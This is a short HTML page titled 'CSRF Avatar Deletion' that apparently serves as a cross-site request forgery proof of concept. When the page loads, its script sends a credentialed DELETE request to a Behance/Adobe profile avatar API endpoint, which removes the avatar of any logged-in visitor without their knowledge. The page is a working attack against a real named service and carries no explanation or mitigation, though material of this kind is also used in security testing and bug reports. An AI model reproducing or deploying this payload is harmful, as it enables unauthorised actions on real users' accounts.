<!DOCTYPE html>
<html>
<head>
  <title>CSRF Avatar Deletion</title>
</head>
<body>
  <h1>Deleting your avatar...</h1>

  <script>
    fetch("https://cc-api-behance.adobe.io/v2/profile/avatar/", {
      method: "DELETE",
      credentials: "include"
    }).then(res => {
      console.log("Avatar delete response:", res.status);
    }).catch(console.error);
  </script>
</body>
</html>
